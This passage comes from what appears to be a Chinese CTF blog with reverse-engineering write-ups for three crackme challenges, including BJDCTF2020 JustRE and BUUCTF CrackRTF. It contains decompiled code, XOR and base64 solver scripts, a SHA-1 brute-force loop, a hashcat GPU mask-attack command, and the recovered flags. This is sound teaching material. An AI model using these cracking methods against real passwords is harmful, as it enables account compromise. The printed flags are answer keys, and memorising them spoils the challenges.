<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_4009C6</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+40h] [rbp-E0h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-D8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+50h] [rbp-D0h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+58h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">13</span>]; <span class="comment">// [rsp+60h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">4</span>]; <span class="comment">// [rsp+6Dh] [rbp-B3h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v14[<span class="number">19</span>]; <span class="comment">// [rsp+71h] [rbp-AFh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">72</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v19; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);</span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">  <span class="comment">//上面这几行代码将v12~v14填充为&quot;Iodl&gt;Qnb(ocy\x7fy.i\x7fd`3w&#125;wek9&#123;iy=~yL@EC&quot;</span></span><br><span class="line">  <span class="comment">//这一长度为36的字符, 与后续v15的比较做准备</span></span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);</span><br><span class="line">  <span class="comment">//根据经验,sub_4406E0()应该是某种输入函数</span></span><br><span class="line">  <span class="comment">//感觉类似scanf_s(),后面的37应该是限制长度</span></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  <span class="comment">//可见v15的长度应该为36,但是v15数组长度只有32,这说明v16的值被输入函数越界覆盖</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    <span class="comment">//从这里可以猜出sub_424BA0()就是strlen()</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      <span class="comment">//将输入字符串与下标异或后与v12对比.已知v12很容易推出v15的值</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br><span class="line">    <span class="comment">//v18长度应为39</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="comment">//进到sub_400E44()里可以看到它用了base64码表,应该是base64编码函数</span></span><br><span class="line">      <span class="comment">//上面对v18进行了10次base64编码</span></span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      <span class="comment">//sub_400360()应该是strcmp()</span></span><br><span class="line">      <span class="comment">//对比编码10次后的值是否与off_6CC090这个字符串相等</span></span><br><span class="line">      <span class="comment">//将off_6CC090解码10次就可以得到v18</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到v15</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;Iodl&gt;Qnb(ocy\x7fy.i\x7fd`3w&#125;wek9&#123;iy=~yL@EC&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(string[i])), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#Info:The first four chars are `flag`</span></span><br><span class="line"><span class="comment">#一个提示, 但是不知道它指的前4个字符是谁的前4个</span></span><br></pre></td></tr></table></figure>
<p>得到v18</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0\</span></span><br><span class="line"><span class="string">xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVT\</span></span><br><span class="line"><span class="string">VYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia\</span></span><br><span class="line"><span class="string">0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlh\</span></span><br><span class="line"><span class="string">MHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFd\</span></span><br><span class="line"><span class="string">ha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZG\</span></span><br><span class="line"><span class="string">xiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZ\</span></span><br><span class="line"><span class="string">FRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRG\</span></span><br><span class="line"><span class="string">Tk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGN\</span></span><br><span class="line"><span class="string">HOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE\</span></span><br><span class="line"><span class="string">5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFe\</span></span><br><span class="line"><span class="string">FduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ==</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    string = base64.b64decode(string)</span><br><span class="line"><span class="built_in">print</span>(string.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#https://bbs.pediy.com/thread-254172.htm</span></span><br><span class="line"><span class="comment">#怎么是个网站????我的flag呢?!</span></span><br></pre></td></tr></table></figure>
<p>打开网站, 很好, 上当了...</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128165228452.png"
alt="image-20220128165228452" />
<figcaption aria-hidden="true">image-20220128165228452</figcaption>
</figure>
<del>
搞到这里了却发现是个假的, 好尴尬😅
</del>
<p>看了别人的WP才知道答案原来从我眼前溜过了</p>
<p><code>off_6CC090</code>这个字符串附近有点东西</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128230344597.png"
alt="image-20220128230344597" />
<figcaption aria-hidden="true">image-20220128230344597</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128230404288.png"
alt="image-20220128230404288" />
<figcaption aria-hidden="true">image-20220128230404288</figcaption>
</figure>
<p>交叉引用找过去</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128230447817.png"
alt="image-20220128230447817" />
<figcaption aria-hidden="true">image-20220128230447817</figcaption>
</figure>
<p>分析一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400D35</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = sub_43FD20(<span class="number">0LL</span>) - qword_6CEE38;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1233</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F790(v1);</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    v1 = sub_40FE60() ^ <span class="number">0x98765432</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//上面这一坨不是很懂</span></span><br><span class="line">  v4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)v1 ^ byte_6CC0A0[<span class="number">0</span>]) == <span class="number">102</span> &amp;&amp; (HIBYTE(v4) ^ (<span class="type">unsigned</span> __int8)byte_6CC0A3) == <span class="number">103</span> )</span><br><span class="line">  <span class="comment">//这个判断无关紧要,直接看下面</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">24</span>; ++j )</span><br><span class="line">      sub_410E90((<span class="type">unsigned</span> __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&amp;v4 + j % <span class="number">4</span>)));</span><br><span class="line">    <span class="comment">//关键点应该就在这里了,byte_6CC0A0这个字符串的内容已知,异或的密钥只有4位,</span></span><br><span class="line">    <span class="comment">//结合前面给出的提示,前面4位是&quot;flag&quot;,我们就可以得出密钥,从而解密出flag</span></span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>解密代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> ciphertext[<span class="number">25</span>] =</span><br><span class="line">	&#123;</span><br><span class="line">	   <span class="number">64</span>,  <span class="number">53</span>,  <span class="number">32</span>,  <span class="number">86</span>,  <span class="number">93</span>,  <span class="number">24</span>,  <span class="number">34</span>,  <span class="number">69</span>,  <span class="number">23</span>,  <span class="number">47</span>,</span><br><span class="line">	   <span class="number">36</span>, <span class="number">110</span>,  <span class="number">98</span>,  <span class="number">60</span>,  <span class="number">39</span>,  <span class="number">84</span>,  <span class="number">72</span>, <span class="number">108</span>,  <span class="number">36</span>, <span class="number">110</span>,</span><br><span class="line">	  <span class="number">114</span>,  <span class="number">60</span>,  <span class="number">50</span>,  <span class="number">69</span>,  <span class="number">91</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">char</span> hint[<span class="number">4</span>] = &#123; <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">char</span> key[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">-128</span>; j &lt;= <span class="number">127</span>; j++)</span><br><span class="line">			<span class="keyword">if</span> ((ciphertext[i] ^ j) == hint[i])</span><br><span class="line">				key[i] = j;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++)</span><br><span class="line">		<span class="built_in">putchar</span>(ciphertext[i] ^ key[i % <span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;Act1ve_Defen5e_Test&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BJDCTF2020]JustRE</title>
    <url>/2022/01/23/%5BReverse%5DBJDCTF2020-JustRE/</url>
    <content><![CDATA[<p>无壳, 主函数大部分都是<code>Windows</code>的<code>API</code>,
关键是看这个函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231416516.png"
alt="image-20220123141627396" />
<figcaption aria-hidden="true">image-20220123141627396</figcaption>
</figure>
<p>再跟进去可以找到另一个函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231417376.png"
alt="image-20220123141745338" />
<figcaption aria-hidden="true">image-20220123141745338</figcaption>
</figure>
<p>还是没有啥有价值的信息, 但是找到了熟悉的函数, 在之前出现过, 见 <a
href="/2022/01/22/%5BReverse%5D刮开有奖/">刮开有奖</a></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231420420.png"
alt="image-20220123142023366" />
<figcaption aria-hidden="true">image-20220123142023366</figcaption>
</figure>
<p>果然, 答案就在这里了,
所以<strong>flag</strong>就是<code>flag&#123;1999902069a45792d233ac&#125;</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231421934.png"
alt="image-20220123142111899" />
<figcaption aria-hidden="true">image-20220123142111899</figcaption>
</figure>
<p>这题也可以从字符串直接入手, 更快</p>
<blockquote>
<del>
还可以点19999次直接出flag
</del>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231422495.png"
alt="image-20220123142250428" />
<figcaption aria-hidden="true">image-20220123142250428</figcaption>
</figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]CrackRTF</title>
    <url>/2022/01/26/%5BReverse%5DCrackRTF/</url>
    <content><![CDATA[<p>无壳, 拖进<code>IDA</code>, F5查看伪代码</p>
<p>可以看到两个关键函数</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261648536.png"
alt="image-20220126164811383" />
<figcaption aria-hidden="true">image-20220126164811383</figcaption>
</figure>
<p>两个函数结构区别不大,
里面调用了很多<code>Widnwos</code>的<code>CryptoAPI</code></p>
<p>这里以<code>sub_40100A()</code>为例,
通过它间接调用<code>sub_401230()</code></p>
<p>查询微软文档,
<code>CryptCreateHash()</code>函数的第二个参数指明算法类型</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261654973.png"
alt="image-20220126165402916" />
<figcaption aria-hidden="true">image-20220126165402916</figcaption>
</figure>
<p>查表可以得知这个函数是进行<code>SHA-1</code>哈希</p>
<blockquote>
<p>微软文档: <a
href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">MSDN</a></p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261708292.png"
alt="image-20220126170805262" />
<figcaption aria-hidden="true">image-20220126170805262</figcaption>
</figure>
<p>同理可以得知<code>sub_401019()</code>是进行<code>MD5</code>哈希的函数</p>
<p>通过这一段可以得知第一段密码长度是6位, 且为6位数字, 可以直接穷举</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(Destination) != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Must be 6 characters!\n&quot;</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = atoi(Destination);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt; <span class="number">100000</span> )</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100001</span>,<span class="number">1000000</span>):</span><br><span class="line">	hasher = hashlib.sha1()</span><br><span class="line">	hasher.update((<span class="built_in">str</span>(i)+<span class="string">&quot;@DBApp&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> hasher.hexdigest().upper() == <span class="string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>:</span><br><span class="line">		<span class="built_in">print</span>(i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="comment">#123321</span></span><br></pre></td></tr></table></figure>
<p>所以第一段密码就是<code>123321</code></p>
<p>第二段密码, 同样长度为6位, 但是第二段密码并没有限制是纯数字.</p>
<p>第二次验证的算法改成了<code>MD5</code>,
进行哈希的内容就是<code>第二段密码+第一段密码+@DBApp</code>组成的18字节字符.</p>
<h2 id="方法一-真暴力破解法">方法一: 真·暴力破解法</h2>
<p>所有<code>ASCII</code>可打印字符从<code>32~126</code>共95个,
第二段密码长6位, 那么可能性就有<span
class="math inline">\(95^6\)</span>种, 大约7350亿种可能,
写脚本穷举好像不太可能...但是,
显卡进行<code>MD5</code>哈希的速度可是相当快的,
CPU则要慢得多多多多多...</p>
<p>放张<code>hashcat</code>的<code>benchmark</code>感受一下,
这还只是个3050Ti, 换做高端一点的那更是快得多.<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261934019.png"
alt="image-20220126193440960" /></p>
<p>换算出来差不多就是164亿次哈希每秒,
照这个速度7350亿种可能也不是很多.</p>
<p>确定可行性之后, 就可以用<code>hashcat</code>来进行穷举</p>
<blockquote>
<p>hashcat: <a href="https://github.com/hashcat/hashcat">Github</a></p>
</blockquote>
<p><strong>N卡</strong>安装好<code>CUDA</code>套件之后,
在<code>hashcat</code>目录下打开命令行执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 27019e688a4e62a649fd99cadaafdb4e -m 0 ?a?a?a?a?a?a123321@DBApp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-a 3 指定攻击方式, 掩码攻击</p>
<p>-m 0 指定哈希类型, MD5</p>
<p>?a?a?a?a?a?a123321@DBApp 是掩码, 前面6位代表所有可打印ASCII字符</p>
</blockquote>
<p>实际的哈希速度要慢一些, 但依然是极快的, 不到半分钟就完成了工作</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261953852.png"
alt="image-20220126195352794" />
<figcaption aria-hidden="true">image-20220126195352794</figcaption>
</figure>
<p>得出第二段密码是<code>~!3a@0</code></p>
<h2 id="方法二-常规方法">方法二: 常规方法</h2>
<p>老实说我是上来就考虑用<code>hashcat</code>尝试穷举的, 没想到还有方法,
看了别人的WP才知道.</p>
<p>关键点在这个函数<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201262038770.png"
alt="image-20220126203837733" /></p>
<p>跟进去找到<code>sub_4014D0()</code>这个函数,
<code>Windows</code>的<code>API</code>有点多,
结合微软的文档分析其用意</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_4014D0</span><span class="params">(LPCSTR lpString)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+50h] [ebp-1Ch]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+58h] [ebp-14h] BYREF</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+5Ch] [ebp-10h]</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+60h] [ebp-Ch]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+68h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  hResData = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hResInfo = FindResourceA(<span class="number">0</span>, (LPCSTR)<span class="number">0x65</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">  <span class="comment">//从载入为当前进程的PE文件,找到一个名为&quot;e&quot;(0x65)且资源类型为&quot;AAA&quot;的资源</span></span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="comment">//计算资源大小</span></span><br><span class="line">  hResData = LoadResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="comment">//载入资源</span></span><br><span class="line">  <span class="keyword">if</span> ( !hResData )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lpBuffer = LockResource(hResData);</span><br><span class="line">  <span class="comment">//锁定资源,返回资源在内存中的指针</span></span><br><span class="line">  sub_401005(lpString, (<span class="type">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">  <span class="comment">//下一个关注点,此函数处理资源,对其进行异或解密</span></span><br><span class="line">  hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//创建名为&quot;dbapp.rtf&quot;的文件,储存解密后的rtf格式flag文件</span></span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    <span class="comment">//将解密后的资源写入到文件中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_401005()</code>调用了<code>sub_401420()</code>,
接着分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401420</span><span class="params">(LPCSTR lpString, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = lstrlenA(lpString);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line">    <span class="comment">//循环异或</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个函数将资源文件每个字节与<code>第二段密码+第一段密码+@DBApp</code>组成密钥进行循环异或从而解密出<strong>flag</strong>文件.
突破点就在<strong>flag</strong>文件的前6个字节上, 要知道,
<code>RTF</code>格式不像<code>txt</code>这种文本格式, 它是有文件头的,
而文件头往往是固定的!
既然<strong>flag</strong>是个<code>RTF</code>格式的文件,
那么它一定符合<code>RTF</code>的文件头规范. 我们可以通过这已知的6个字节,
倒推出密钥前6字节, 即第二段密码.</p>
<p>找个<code>RTF</code>文件看看前面6字节</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201262117489.png"
alt="image-20220126211735455" />
<figcaption aria-hidden="true">image-20220126211735455</figcaption>
</figure>
<p>前6字节是<code>0x7B, 0x5C, 0x72, 0x74, 0x66, 0x31</code></p>
<p>写出解密代码</p>
